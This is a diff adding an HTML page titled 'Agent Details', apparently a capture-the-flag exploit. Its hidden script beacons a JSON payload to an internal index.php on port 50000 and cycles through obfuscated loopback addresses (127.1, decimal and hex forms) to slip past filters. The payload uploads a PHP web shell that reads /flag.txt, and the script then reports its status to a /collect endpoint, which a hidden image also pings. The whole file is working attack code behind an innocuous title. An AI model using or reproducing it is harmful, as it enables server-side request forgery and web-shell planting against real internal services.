@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Agent Details</title>
+</head>
+<body>
+<img src="/collect?ping=1" alt="" style="display:none;" />
+<script>
+(async () => {
+  const payload = "{\"filename\":\"shell.php\",\"content\":\"<?php echo file_get_contents('/flag.txt'); ?>\"}";
+  const blob = new Blob([payload], { type: "application/json" });
+  const targets = [
+    "http://127.0.0.1:50000/index.php",
+    "http://localhost:50000/index.php",
+    "http://127.1:50000/index.php",
+    "http://2130706433:50000/index.php",
+    "http://0x7f000001:50000/index.php"
+  ];
+
+  let status = "failed";
+
+  for (const url of targets) {
+    if (navigator.sendBeacon(url, blob)) {
+      status = `beacon_${url}`;
+      break;
+    }
+  }
+
+  try {
+    await fetch(`${location.origin}/collect?status=${encodeURIComponent(status)}`);
+  } catch (e) {}
+
+  document.body.innerHTML = "<h1>Done</h1>";
+})();
+</script>
+</body>
+</html>
